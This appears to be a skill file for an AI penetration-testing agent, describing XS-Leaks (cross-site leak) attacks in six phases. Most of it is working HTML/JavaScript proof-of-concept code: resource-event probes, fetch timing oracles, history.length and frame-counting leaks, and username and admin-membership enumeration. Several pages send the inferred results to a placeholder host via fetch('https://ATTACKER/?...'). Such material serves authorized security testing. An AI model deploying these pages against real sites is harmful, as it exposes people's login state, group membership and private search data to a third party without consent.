---
name: vuln-xs-leaks
description: "XS-Leaks (cross-site leak) vulnerability testing. Timing attacks, resource event inference, redirect chain leaks, browser side channels, history.length leaks, frame counting. Triggers: 'xs-leaks', 'cross-site leaks', 'timing attack', 'cross-origin timing', 'browser side channel', 'frame counting', 'xs leak', 'cross site information leak'."
---

# XS-Leaks (Cross-Site Leaks)

Infer sensitive data via cross-site side channels: timing, redirects, resource events.

**Note:** XS-Leaks are passive — attacker's page loads target cross-site, observes browser behavior. No direct content read.

---

## Phase 1: Map Differentiating Responses

```bash
TARGET="https://TARGET"

# Find endpoints that behave differently based on state:
# - Authenticated vs unauthenticated (redirect vs 200)
# - Admin vs user (different response size)
# - Resource exists vs not (200 vs 404)
# - Search result count (response length varies)

# Identify binary oracles:
# "Does /admin redirect you?" → authenticated = no redirect
# "Does /user/123 return 200?" → that user exists

# Test with curl:
# Auth: returns 200 (member), 302 (not member)
CODE_AUTH=$(curl -sI -b "session=AUTH_COOKIE" "$TARGET/private-group" -w '%{http_code}' -o /dev/null)
CODE_ANON=$(curl -sI "$TARGET/private-group" -w '%{http_code}' -o /dev/null)
echo "Auth: $CODE_AUTH, Anon: $CODE_ANON"
```

---

## Phase 2: Resource Event Inference (onload/onerror)

```html
<!-- Detect if resource loads (200) or fails (403/404) cross-origin -->
<!DOCTYPE html>
<html>
<script>
const TARGET = "https://TARGET";

// Image resource event:
function probe_image(url) {
  return new Promise(resolve => {
    const img = new Image();
    img.onload = () => resolve("loaded");    // 200 → exists / logged in
    img.onerror = () => resolve("error");   // 403/404 → doesn't exist / not auth
    img.src = url;
  });
}

// Script resource event:
function probe_script(url) {
  return new Promise(resolve => {
    const s = document.createElement("script");
    s.onload = () => resolve("loaded");
    s.onerror = () => resolve("error");
    document.head.appendChild(s);
    s.src = url;
  });
}

// Test: Does target user profile exist?
probe_image(TARGET + "/user/victim/avatar.png").then(result => {
  console.log("User exists:", result === "loaded");
});

// Test: Is viewer in admin group?
probe_script(TARGET + "/admin/api.js").then(result => {
  console.log("Is admin:", result === "loaded");
  // Exfil:
  fetch("https://ATTACKER/?admin=" + (result === "loaded"));
});
</script>
</html>
```

---

## Phase 3: Timing-Based Leaks

```html
<!DOCTYPE html>
<script>
const TARGET = "https://TARGET";

// Measure response time via fetch timing:
async function time_request(url) {
  const start = performance.now();
  try {
    await fetch(url, {mode: 'no-cors', credentials: 'include'});
  } catch(e) {}
  return performance.now() - start;
}

// Timing oracle: search endpoint takes longer with results
async function probe_search(query) {
  const url = TARGET + "/search?q=" + encodeURIComponent(query);
  const times = [];
  
  // Average multiple measurements:
  for (let i = 0; i < 10; i++) {
    times.push(await time_request(url));
    await new Promise(r => setTimeout(r, 100));
  }
  
  const avg = times.reduce((a,b) => a+b, 0) / times.length;
  console.log(`Query "${query}": ${avg.toFixed(0)}ms`);
  return avg;
}

// Binary search for username:
(async () => {
  const baseline = await probe_search("zzzzz_no_results");
  const result_time = await probe_search("admin");
  
  const threshold = baseline * 1.3;
  console.log("'admin' exists:", result_time > threshold);
  
  fetch("https://ATTACKER/?exists=" + (result_time > threshold) + "&time=" + result_time);
})();
</script>
```

---

## Phase 4: Redirect Chain Leaks

```html
<!DOCTYPE html>
<script>
const TARGET = "https://TARGET";

// Count redirects via frame detection:
function probe_redirects(url) {
  return new Promise(resolve => {
    const iframe = document.createElement("iframe");
    iframe.sandbox = "allow-scripts allow-same-origin";
    iframe.style.display = "none";
    document.body.appendChild(iframe);
    
    // Listen for navigation events:
    let navCount = 0;
    iframe.onload = () => {
      navCount++;
      setTimeout(() => {
        resolve(navCount);
        document.body.removeChild(iframe);
      }, 500);
    };
    
    iframe.src = url;
  });
}

// history.length leak (navigation count reveals redirect chain depth):
async function probe_history(url) {
  const win = window.open(url, '_blank', 'width=1,height=1');
  await new Promise(r => setTimeout(r, 1000));
  const hlen = win.history.length;
  win.close();
  return hlen;
}

// 2 redirects = logged out (login redirect chain)
// 0 redirects = logged in (direct access)
probe_history(TARGET + "/dashboard").then(len => {
  const logged_in = len <= 1;
  console.log("Logged in:", logged_in, "history.length:", len);
  fetch("https://ATTACKER/?logged_in=" + logged_in);
});
</script>
```

---

## Phase 5: Frame Counting

```html
<script>
// window.frames.length reveals number of iframes in cross-origin page:
function probe_frames(url) {
  return new Promise(resolve => {
    const win = window.open(url, '_blank', 'width=1,height=1');
    setTimeout(() => {
      try {
        const frameCount = win.frames.length;
        win.close();
        resolve(frameCount);
      } catch(e) {
        win.close();
        resolve(-1);
      }
    }, 1000);
  });
}

// If page A has 3 frames and page B has 1 frame → can distinguish them
probe_frames("https://TARGET/profile/123").then(count => {
  console.log("Frame count:", count);
  fetch("https://ATTACKER/?frames=" + count);
});
</script>
```

---

## Phase 6: Practical Attack Scenarios

```javascript
// Scenario 1: Enumerate valid usernames
const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
async function find_users() {
  for (const prefix of chars) {
    const time = await time_request(TARGET + "/search/users?q=" + prefix);
    if (time > THRESHOLD) {
      console.log("Users starting with:", prefix);
    }
  }
}

// Scenario 2: Detect group membership
// Target: /api/group/admins/check → 200 if member, 403 if not
probe_image("/api/group/admins/badge.png").then(r => {
  fetch("ATTACKER/?in_admins=" + (r === "loaded"));
});

// Scenario 3: Exfiltrate CSRF token timing oracle
// If CSRF token validation is timing-vulnerable:
// Wrong token: fast constant-time reject
// Partially right: slightly longer → timing leak
```

---

## Output

Save to `.omop/engagement/vuln/xs-leaks/`:
- `timing-poc.html` — timing oracle PoC
- `event-poc.html` — resource event PoC
- `results.txt` — inferred information

## Next Phase

→ `pentest-report` for final report
→ `vuln-cache-deception` for cache-based information leaks
